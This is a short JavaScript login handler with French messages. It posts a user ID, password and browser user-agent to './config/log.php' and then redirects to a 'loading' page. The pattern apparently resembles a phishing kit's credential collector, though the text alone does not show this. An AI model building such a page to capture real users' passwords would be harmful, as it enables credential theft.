function login(){
	
var ID_CR =	$("#_userid").val();
var PASS_CR	 =	$("#_pwduser").val();
	
	//alert(ID_sg);
	//alert(PASS_sg);
	
 if(ID_CR==''){

swal({
icon: 'error',
title: 'Erreur !',
text: "Corriger votre saisie"

})	

return false;	
} 
if(PASS_CR==''){

swal({
icon: 'error',
title: 'Erreur !',
text: "Corriger votre saisie"

})	

return false;	
} 


var data_log = 
{
DEVICE_CR       : navigator.userAgent,
ID_CR		    :   ID_CR,
PASS_CR         :	PASS_CR

}; 


var _url = './config/log.php';
$('#cover-spin').show(0);
$.post(_url,data_log,function(data){
 var reponse = JSON.parse(data); 


if(reponse.statut=="error"){	

swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});
}else if(reponse.statut=="success"){	


     window.location="./Select/loading.html";
    

    

} 


})
}